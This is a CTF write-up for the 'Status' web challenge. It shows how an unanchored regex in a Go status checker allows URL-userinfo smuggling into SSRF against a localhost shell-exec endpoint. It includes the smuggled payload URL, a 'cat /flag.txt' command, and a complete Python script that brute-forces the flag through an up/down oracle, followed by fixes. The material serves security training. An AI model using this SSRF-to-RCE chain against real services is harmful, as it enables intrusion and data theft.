# Status - CTF Challenge Writeup

- **Challenge Name:** Status
- **Category:** Web Security
- **Attached:** [`web-status.zip`](./Files/web-status.zip)

## Exploration

We are provided with the source code of a small Go web server. Its purpose is to check whether a given website is "up" or "down." The server enforces a regex check so that only URLs starting with `ctf.uscybergames.com` are allowed.

The application exposes two endpoints:

- `/status-check`: Takes a url parameter and reports the status of the target site.

- `/admin/exec`: An internal IT maintenance endpoint that executes arbitrary shell commands (intended to be accessible only from localhost).

At first glance, the system appears restricted and hardened (regex checks, stripped-down Docker image). However, with careful analysis we discovered multiple misconfigurations that chain together into a full SSRF → RCE → flag exfiltration attack.

### 1. Over-permissive regex in `/status-check`

```go
match, _ := regexp.MatchString(`^(https?:\/\/)?ctf.uscybergames\.com`, url)
```

- The regex **lacks an end-of-string anchor (`$`)**, so it matches *any* string that begins with `http://ctf.uscybergames.com`, regardless of the real host.

- This opens the door to URL smuggling via usernames:

  ```
  http://ctf.uscybergames.com@127.0.0.1:8080/admin/exec?cmd=cat%20/flag.txt
  ```

  - The regex passes since the string starts with `ctf.uscybergames.com`.
  - But when Go parses it, `ctf.uscybergames.com` is treated as the **username**, and `127.0.0.1:8080` is the actual host.
  - The request is routed to the internal admin interface.

- This turns into a classic **SSRF → RCE chain**:

  1. Call `/status-check?url=<poisoned-url>`.
  1. Go’s `client.Get` follows the URL to `127.0.0.1:8080/admin/exec`.
  1. Since the request comes from `127.0.0.1`, it passes internal IP checks.

### 2. Unrestricted shell execution in `/admin/exec`

```go
cmd := exec.Command("sh", "-c", cmdStr)
```

- No sanitization. No escaping.
- Once you can reach `/admin/exec`, you have **arbitrary shell command execution**.

### 3. Dockerfile "hardening" is mostly cosmetic

```dockerfile
FROM busybox:latest
WORKDIR /bin
RUN rm -rf *
COPY --from=busybox:latest /bin/busybox /bin/sh
COPY --from=builder /build/app app
COPY flag.txt /flag.txt
```

- The author wipes `/bin` and leaves only `/bin/sh`.
- This blocks common tools (`cat`, `echo`, `curl`, etc.), forcing attackers to rely solely on shell built-ins.
- Annoying, but not a real defense.

### 4. Insecure TLS settings

```go
http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
```

- Disabling TLS verification globally means **any HTTPS service can be spoofed or MITM’d**.
- This didn’t directly matter for the exploit, but it’s a dangerous practice.

## Crafting the Exploit

With only `sh` built-ins available, we needed a **blind exfiltration strategy**. The only feedback channel was the service’s "up" vs "down" status.

**Key insight**: `/admin/exec`’s exit code controls `/status-check`’s output:

- `exit 0` → "up"
- non-zero exit → "down"

So we can brute-force the flag, one character at a time:

1. `read flag < /flag.txt`
1. Use a `case` statement to check if the flag starts with a guessed prefix.
1. Exit `0` if true, `1` otherwise.
1. Use "up"/"down" as the oracle.

### Exploit Script

```python
#!/usr/bin/env python3
import requests
import time
import string
from urllib.parse import quote

BASE = "http://127.0.0.1:8080"
sess = requests.Session()

alphabet = string.ascii_letters + string.digits + "{}_"
flag = ""

print("Starting blind leak...")

while True:
    found = False
    for c in alphabet:
        print(f"Trying {c}", end="\r")
        prefix = flag + c
        # build a shell snippet that:
        #  1) reads the flag into $flag
        #  2) tests if $flag starts with our prefix
        #  3) exits 0 if yes, 1 if no
        #  Optimization: Binary Search
        sh_cmd = (
            "read flag < /flag.txt; "
            'case "$flag" in '
            f'"{prefix}"*) exit 0 ;; '
            "*) exit 1 ;; "
            "esac"
        )
        payload = quote(sh_cmd, safe="")
        ssrf = "http://ctf.uscybergames.com@127.0.0.1:8080/admin/exec?cmd=" + payload

        r = sess.get(f"{BASE}/status-check", params={"url": ssrf}, timeout=5)
        body = r.text.strip()

        # "up" means exit code 0 i.e. prefix is correct
        if body == "up":
            flag = prefix
            print(f"Got character: {c!r} -> flag = {flag}")
            found = True
            break

        time.sleep(0.1)

    if not found:
        print("Leak complete. Final flag:", flag)
        break
```

## Defense Recommendations

1. Fix regex: `^(https?:\/\/)?ctf\.uscybergames\.com$`
1. Validate the parsed URL hostname, not just the raw string.
1. Remove or lock down `/admin/exec`.
1. Run containers as non-root.

## Real-World Impact

This exploit chain demonstrates a **textbook SSRF → RCE** path, similar to what often happens in cloud environments where services trust requests from `localhost` or internal networks. Small misconfigurations can cascade into full compromise.
